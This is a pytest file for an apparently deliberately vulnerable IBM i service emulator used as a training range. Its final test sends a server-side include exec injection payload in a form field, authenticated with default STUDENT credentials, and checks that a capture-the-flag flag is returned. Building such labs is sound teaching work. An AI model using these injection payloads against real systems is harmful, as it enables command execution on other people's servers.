"""The services listener: off unless asked for, loopback only, and real HTTP over a real socket."""

import asyncio
import socket
from base64 import b64encode

import pytest

from silverlake import flags
from silverlake.config import ConfigError
from silverlake.net import services
from silverlake.system import profiles
from netutil import all_ports, free_port


def test_services_are_off_unless_asked_for():
    assert not services.wanted({}) and not services.wanted({"SILVERLAKE_SERVICES": "0"})
    assert services.wanted({"SILVERLAKE_SERVICES": "1"})


def test_ports_default_to_the_real_ones_and_can_move():
    assert services.ports({}) == {"httpadmin": 2001, "ftp": 2121, "mapper": 4449, "signon": 8476, "tls5250": 5992,
                                  "httpadmin_tls": 2010, "ftp_tls": 2990, "signon_tls": 9476}
    assert services.ports({"SILVERLAKE_HTTPADMIN_PORT": "2999"})["httpadmin"] == 2999
    with pytest.raises(ValueError, match="same port"):
        services.ports({"SILVERLAKE_HTTPADMIN_PORT": "2121"})
    with pytest.raises(ValueError):
        services.ports({"SILVERLAKE_HTTPADMIN_PORT": "70000"})


def test_services_refuse_to_bind_beyond_loopback():
    with pytest.raises(ConfigError):
        asyncio.run(services.start("0.0.0.0", lambda: None, {}))


def request(port, raw: bytes) -> bytes:
    with socket.create_connection(("127.0.0.1", port), timeout=3) as s:
        s.sendall(raw)
        out = b""
        while chunk := s.recv(4096):
            out += chunk
    return out


def test_the_console_answers_over_a_real_socket_and_the_exploit_works_end_to_end():
    store = profiles.load()
    port = free_port()
    cred = b64encode(b"STUDENT:STUDENT").decode()
    body = "name=ZZTEST&description=%3C%21--%23exec+cmd%3D%22DSPMSG+MSGQ%28QTMHHTTP%29%22+--%3E"

    async def go():
        servers = await services.start("127.0.0.1", lambda: store, all_ports(httpadmin=port))
        loop = asyncio.get_running_loop()
        try:
            call = lambda raw: loop.run_in_executor(None, request, port, raw)
            anon = await call(b"GET /HTTPAdmin HTTP/1.0\r\n\r\n")
            post = await call((f"POST /HTTPAdmin/servers HTTP/1.0\r\nAuthorization: Basic {cred}\r\n"
                               f"Content-Length: {len(body)}\r\n\r\n{body}").encode())
            page = await call(f"GET /HTTPAdmin/servers HTTP/1.0\r\nAuthorization: Basic {cred}\r\n\r\n".encode())
            big = await call((f"POST /HTTPAdmin/servers HTTP/1.0\r\nAuthorization: Basic {cred}\r\n"
                              "Content-Length: 999999\r\n\r\n").encode())
            junk = await call(b"nonsense\r\n\r\n")
            return anon, post, page, big, junk
        finally:
            for s in servers:
                s.close()

    anon, post, page, big, junk = asyncio.run(go())
    assert anon.startswith(b"HTTP/1.0 401") and b"WWW-Authenticate: Basic" in anon
    assert post.startswith(b"HTTP/1.0 302") and b"Location: /HTTPAdmin/servers" in post
    assert page.startswith(b"HTTP/1.0 200") and flags.flag("httpadmin-ssi-injection").encode() in page
    assert big.startswith(b"HTTP/1.0 413")
    assert junk.startswith(b"HTTP/1.0 400")
